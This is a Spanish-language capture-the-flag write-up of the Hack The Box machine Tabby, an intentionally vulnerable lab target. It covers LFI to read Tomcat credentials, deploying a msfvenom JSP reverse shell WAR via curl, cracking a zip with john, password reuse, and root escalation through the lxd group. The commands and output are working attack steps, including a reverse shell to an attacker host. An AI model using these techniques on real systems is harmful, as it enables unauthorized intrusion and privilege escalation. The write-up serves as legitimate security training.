
<p align="center">
<img src="https://miro.medium.com/v2/resize:fit:591/1*mh2clkXmiJxHT_y7hU2WxQ.png">
</p>



Tabby es una máquina Linux de dificultad fácil en la cual vamos a aprovechar de la vulnerabilidad LFI para leer archivos sensibles del servidor de Apache Tomcat 9. Posteriormente debemos crear un payload en Java para tener shell y de esta manera, realizar enumeración de manera manual para encontrar un archivo .zip que contiene la contraseña del usuario. Para la fase de escalamiento de privilegios, observamos que el usuario es miembro del grupo lxd, así que nos vamos a aprovechar de esto para escalar privilegios y convertirnos en administrador.


## Reconocimiento y Enumeración

### Ping

Para un acceso más rápido, agregamos la dirección IP de la máquina al archivo `/etc/hosts` de la siguiente forma:

```console
10.10.10.194    tabby.htb
```

Luego, se debe revisar que la máquina esté activa. Hacemos un ping usando el siguiente comando:

```
ping -c 4 tabby.htb
```

- `-c <n>` = realizar *n* veces el ping

### Nmap

Se procede a realizar un escaneo de todos los puertos con la herramienta nmap usando el siguiente comando:

```console
nmap -p- --open -T5 -v -n tabby.htb -oG all-ports
```

- `-p-:` escanea todos los 65536 puertos
- `--open:` solo se va a tener en cuenta los puertos abiertos
- `-T5:` establece la plantilla de temporización, el rango es entre 0-5 y por lo tanto, el escaneo va a ir a una mayor velocidad
- `-v:` cuando nmap descubre un puerto, lo imprime por consola
- `-n:` se desactiva la resolución de DNS
- `-oG:` el archivo se va a guardar en formato grepable 

El output de nmap es el siguiente:

```bash
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Tabby]           
└──╼ $nmap -p- --open -T5 -v -n tabby.htb -oG all-ports                
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-20 11:53 EDT

PORT      STATE SERVICE                                                           
22/tcp    open  ssh                         
80/tcp    open  http                            
8080/tcp  open  http-proxy
```

Una vez se sabe qué puertos están abiertos en la máquina objetivo se procede a revisar las versiones de los servicios usando el comando:

```
nmap -sC -sV -p22,80,8080 tabby.htb -oN targeted.txt
```

- `-sC:`  realiza un escaneo usando los scripts por defecto que se encuentran en la base de datos de nmap.
- `-sV:` intenta encontrar la versión del servicio que está corriendo en el puerto correspondiente.
- `-p:` se establece los puertos que deseo hacer el escaneo.
- `-oN:` el archivo se va a guardar en un formato normal, en este caso en formato de texto.

El output de nmap es el siguiente:

```bash
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Tabby]
└──╼ #nmap -sC -sV -p22,80,8080 tabby.htb -oN targeted.txt                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-20 11:20 -05

PORT    STATE SERVICE      VERSION        
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Algunos de los puertos que están abiertos corresponde a los siguientes servicios:

- `Puerto 22 (SSH Secure Shell):` sirve para acceder de manera remota a máquinas de
  manera segura.

- `Puerto 80 (HTTP):` se utiliza para la navegación web de forma no segura.

  

### Enumeración HTTP

Revisando cada una de las páginas disponibles del sitio, encontramos que en la página `news` en la URL se incluye el archivo `statement` como se observa en la siguiente figura

<p align="center">
<img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TuPvst2NG-matKdnnnfUdw.png">
</p>

Vamos a revisar si el sitio es vulnerable a [LFI](https://resources.infosecinstitute.com/php-lab-file-inclusion-attacks) consiste en incluir ficheros locales, es decir, archivos que se encuentran en el mismo servidor de la web con este tipo de fallo. Esto se produce como consecuencia de un fallo en la programación de la página, filtrando inadecuadamente lo que se incluye al usar funciones en PHP para incluir archivos. En este caso, vamos a probar la vulnerabilidad de directory traversal que una forma de obtener acceso no autorizado a archivos sensibles.

<p align="center">
<img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DXAQJyl_TI7ld1LnIl3OHQ.png">
</p>

Como se observa en la imagen anterior, el sitio si es vulnerable a este tipo de ataque. Ahora nos dirigimos a la página que está en el puerto 8080 y encontramos que se trata de un servidor web Apache Tomcat 9.

<p align="center">
<img src="https://0xdfimages.gitlab.io/img/image-20200622170225550.webp">
</p>

Buscando en internet la ubicación de los archivos del paquete de Tomcat, encontramos en la siguiente [página](https://packages.debian.org/sid/all/tomcat9/filelist) de Debian donde se encuentran estos archivos. De los que más nos interesan son los siguientes:

```bash
/etc/rsyslog.d/tomcat9.conf
/usr/share/tomcat9/etc/tomcat-users.xml
/usr/share/tomcat9/etc/web.xml
/usr/share/tomcat9/etc/context.xml
/usr/share/tomcat9-root/default_root/META-INF/context.xml
```

Como el sitio es vulnerable a `directory traversal` vamos a probar con las ubicaciones anteriores para mirar si alguno de estos archivos nos da alguna información sensible.  En la siguiente imagen, podemos observar que tenemos acceso al archivo `tomcat-users.xml`y encontramos el nombre del usuario `tomcat` y su contraseña `$3cureP4s5w0rd123!`.

<p align="center">
<img src="https://0xdfimages.gitlab.io/img/image-20200622203509614.webp">
</p>



## Explotación

Leyendo la [documentación](http://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Deploy_A_New_Application_Archive_(WAR)_Remotely) de Apache Tomcat 9, encontramos que hay una forma de desplegar un archivo `.war` de forma remota, realizando una solicitud `PUT` al servidor.

Para esto, primero vamos a crear un payload con msfvenom de la siguiente manera:

```bash
┌─[root@parrot]─[/home/nicolasmira101]                                    
└──╼ #msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.26 LPORT=1234 -f war > code.war            
```

Ahora, vamos a desplegar el archivo `.war` que creamos anteriormente:

```bash
┌─[root@parrot]─[/home/nicolasmira101]                                    
└──╼ #curl --user tomcat:'$3cureP4s5w0rd123!' --upload-file code.war http://10.10.10.194:8080/manager/text/deploy?path=/code  
```

Antes de ejecutar el archivo, vamos a crear nuestra sesión en netcat para obtener la shell reversa

```bash
┌─[root@parrot]─[/home/nicolasmira101]
└──╼ #nc -nvlp 1234
listening on [any] 1234 ...
```

Y ahora sí ejecutando el archivo escribiendo lo siguiente en el navegador:

```bash
http://10.10.10.194:8080/code/
```

Volvemos a netcat y como podemos observar, ya tenemos una shell

```bash
┌──[root@parrot]─[/home/nicolasmira101]
└──╼ #nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.26] from (UNKNOWN) [10.10.10.194] 56188
whoami
tomcat
python3 -c 'import pty;pty.spawn("/bin/bash")'
tomcat@tabby:/var/lib/tomcat9$ 
```

Enumerando manualmente, encontramos en el directorio `/var/www/html/files` un archivo `.zip`

```bash
tomcat@tabby:/var/www/html/files$ ls
ls                               
16162020_backup.zip  archive  revoked_certs  statement 
```

Como estos archivos se encuentran dentro del directorio del servidor web, con `wget` lo descargamos directamente en nuestra máquina

```bash
┌──[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Tabby]
└──╼ #wget http://10.10.10.194/files/16162020_backup.zip
--2020-06-22 13:43:24--  http://10.10.10.194/files/16162020_backup.zip
Connecting to 10.10.10.194:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8716 (8.5K) [application/zip]
Saving to: ‘16162020_backup.zip.1’

16162020_backup.zip.1             100%[============================================================>]   8.51K  --.-KB/s    in 0s      

2020-06-22 13:43:25 (67.8 MB/s) - ‘16162020_backup.zip.1’ saved [8716/8716]
```

Ahora vamos a descomprimirlo, sin embargo, nos solicita contraseña

```bash
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Tabby]
└──╼ #unzip 16162020_backup.zip 
Archive:  16162020_backup.zip
[16162020_backup.zip] var/www/html/favicon.ico password: 
```

Así que vamos a utilizar la herramienta `zip2john` para extraer el hash del archivo y posteriormente crackear este hash con `john`

```bash
┌──[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Tabby]
└──╼ #zip2john 16162020_backup.zip > backup.hash                                                                                       
16162020_backup.zip/var/www/html/assets/ is not encrypted!                                                                             
ver 1.0 16162020_backup.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type                         
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/favicon.ico PKZIP Encr: 2b chk, TS_chk, cmplen=338, decmplen=766, crc=282B6D
E2

┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Tabby]
└──╼ #cat backup.hash 
16162020_backup.zip:$pkzip2$3*2*1*0*0*24*02f9*5d46*ccf7b799809a3d3c12abb83063af3c6dd538521379c8d744cd195945926884341a9c4f74*1*0*8*24*285c*5935*f422c178c96c8537b1297ae19ab6b91f497252d0a4efe86b3264ee48b099ed6dd54811ff*2*0*72*7b*5c67f19e*1b1f*4f*8*72*5c67*5a7a*ca5fafc4738500a9b5a41c17d7ee193634e3f8e483b6795e898581d0fe5198d16fe5332ea7d4a299e95ebfff6b9f955427563773b68eaee312d2bb841eecd6b9cc70a7597226c7a8724b0fcd43e4d0183f0ad47c14bf0268c1113ff57e11fc2e74d72a8d30f3590adc3393dddac6dcb11bfd*$/pkzip2$::16162020_backup.zip:var/www/html/news.php, var/www/html/logo.png, var/www/html/index.php:16162020_backup.zip

┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Tabby]
└──╼ #john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (16162020_backup.zip)
1g 0:00:00:04 DONE (2020-06-22 15:20) 0.2197g/s 2276Kp/s 2276Kc/s 2276KC/s adnc153..adilizinha
```

Como vemos, encontramos la contraseña `admin@it`.  Normalmente los usuarios utilizan la misma contraseña para todos los servicios y aplicaciones. Si nos dirigimos a la carpeta home, encontramos que hay un usuario llamado `ash` así que con el comando `su` nos vamos a mover a este usuario para obtener la flag del usuario.

```bash
tomcat@tabby:/home$ ls
ls
ash

tomcat@tabby:/var/lib/tomcat9$ su ash        
su ash
Password: admin@it

ash@tabby:/var/lib/tomcat9$ cd /home/ash
cd /home/ash
ash@tabby:~$ ls
ls
user.txt
ash@tabby:~$ cat user.txt
cat user.txt
a57576...........................
```




## Escalamiento de privilegios

Con el comando `id` averiguamos los nombres de usuarios y grupos del usuario actual, en este caso, `ash` y encontramos que hay un grupo particular que es `lxd`

```bash
ash@tabby:/home$ id
id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

[Linux Daemon](https://linuxcontainers.org/lxd/introduction/) (lxd) es un administrador de contenedores del sistema de próxima generación. Ofrece una experiencia de usuario similar a las máquinas virtuales pero en su lugar utiliza contenedores Linux. Buscando en internet al respecto, encontramos el siguiente [artículo](https://www.hackingarticles.in/lxd-privilege-escalation/) que nos describe cómo una cuenta en el sistema que es miembro del grupo `lxd` es capaz de escalar el privilegio mediante la explotación de las características de LXD.

Lo primero que vamos a hacer es clonar el siguiente [repositorio](https://github.com/saghul/lxd-alpine-builder.git) que es un script que  proporciona una forma de crear imágenes de [Alpine Linux](https://alpinelinux.org/) para su uso con LXD. Se basa en las plantillas LXC (Linux Container). Posteriormente, debemos ejecutar el script `build-alpine` como se muestra a continuación:

```bash
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Tabby]
└──╼ #git clone https://github.com/saghul/lxd-alpine-builder.git
Cloning into 'lxd-alpine-builder'...
remote: Enumerating objects: 27, done.
remote: Total 27 (delta 0), reused 0 (delta 0), pack-reused 27
Receiving objects: 100% (27/27), 16.00 KiB | 2.67 MiB/s, done.
Resolving deltas: 100% (6/6), done.

┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Tabby]
└──╼ #cd lxd-alpine-builder/

┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Tabby/lxd-alpine-builder]
└──╼ #ls
build-alpine  LICENSE  README.md

┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Tabby/lxd-alpine-builder]                                        
└──╼ #./build-alpine       
Determining the latest release... v3.12
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.12/main/x86_64
Downloading alpine-mirrors-3.5.10-r0.apk 
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
Downloading alpine-keys-2.2-r0.apk                                                   Executing openrc-0.42.1-r10.post-install
(5/19) Installing alpine-conf (3.9.0-r1)
(6/19) Installing libcrypto1.1 (1.1.1g-r0)
(7/19) Installing libssl1.1 (1.1.1g-r0)
(8/19) Installing ca-certificates-bundle (20191127-r4)
(9/19) Installing libtls-standalone (2.9.1-r1)
(10/19) Installing ssl_client (1.31.1-r19)
(11/19) Installing zlib (1.2.11-r3)
(12/19) Installing apk-tools (2.10.5-r1)
(13/19) Installing busybox-suid (1.31.1-r19)
(14/19) Installing busybox-initscripts (3.2-r2)
Executing busybox-initscripts-3.2-r2.post-install
(15/19) Installing scanelf (1.2.6-r0)
(16/19) Installing musl-utils (1.1.24-r9)
(17/19) Installing libc-utils (0.7.2-r3)
(18/19) Installing alpine-keys (2.2-r0)
(19/19) Installing alpine-base (3.12.0-r0)
Executing busybox-1.31.1-r19.trigger
OK: 8 MiB in 19 packages
```

Nos crea un archivo `.tar.gz` y ahora lo que debemos hacer es crear un servidor http con Python.

```bash
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Tabby/lxd-alpine-builder]
└──╼ #ls
alpine-v3.12-x86_64-20200621_0334.tar.gz  build-alpine  LICENSE  README.md

┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Tabby/lxd-alpine-builder]
└──╼ #python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

En la máquina de la víctima, descargamos este archivo con `wget`

```bash
ash@tabby:~$ wget http://10.10.14.26:80/alpine-v3.12-x86_64-20200621_0334.tar.gz
<0.14.26:80/alpine-v3.12-x86_64-20200621_0334.tar.gz
--2020-06-21 08:51:53--  http://10.10.14.26/alpine-v3.12-x86_64-20200621_0334.tar.gz
Connecting to 10.10.14.26:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3109761 (3.0M) [application/gzip]
Saving to: ‘alpine-v3.12-x86_64-20200621_0334.tar.gz’

alpine-v3.12-x86_64 100%[===================>]   2.96M   252KB/s    in 12s     

2020-06-21 08:52:05 (251 KB/s) - ‘alpine-v3.12-x86_64-20200621_0334.tar.gz’ saved [3109761/3109761]
```

Ahora, vamos a importar la imagen e inicializamos el `lxd` antes de utilizarlo.

```bash
ash@tabby:~$ lxc image import ./alpine-v3.12-x86_64-20200621_0334.tar.gz --alias hackthebox                                            
<3.12-x86_64-20200621_0334.tar.gz --alias hackthebox                                                                                   
ash@tabby:~$ lxd init                                       
lxd init                                                                                                                               
Would you like to use LXD clustering? (yes/no) [default=no]:
Do you want to configure a new storage pool? (yes/no) [default=yes]:
Name of the new storage pool [default=default]:
Name of the storage backend to use (btrfs, dir, lvm, ceph) [default=btrfs]:
Create a new BTRFS pool? (yes/no) [default=yes]:
Would you like to use an existing block device? (yes/no) [default=no]:
Size in GB of the new loop device (1GB minimum) [default=15GB]: 
Would you like LXD to be available over the network? (yes/no) [default=no]:
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]:
```

Ahora sí inicializamos la imagen que creamos anteriormente en un nuevo contenedor y montamos este dentro del directorio `/root`

```bash
ash@tabby:~$ lxc init hackthebox ignite -c security.privileged=true
lxc init hackthebox ignite -c security.privileged=true
Creating ignite

ash@tabby:~$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
<ydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite

ash@tabby:~$ lxc start ignite
lxc start ignite
```

Y ahora ejecutamos la shell y nos dirigimos al directorio `/mnt/root/root` para obtener la flag del root. Nos crea una shell con un aspecto peculiar pero no hay problema, podemos escribir los comandos de consola común y corriente.

```bash
ash@tabby:~$ lxc exec ignite /bin/sh              
lxc exec ignite /bin/sh                                                                                                                                           
~ # ^[[24;5Rid                                     
id                        
uid=0(root) gid=0(root)                                                                                                                
~ # ^[[24;5Rcd /mnt/root/root
cd /mnt/root/root

/mnt/root/root # ^[[24;18Rls
ls
root.txt
/mnt/root/root # ^[[24;18Rcat root.txt
cat root.txt
7749b3...........................
```
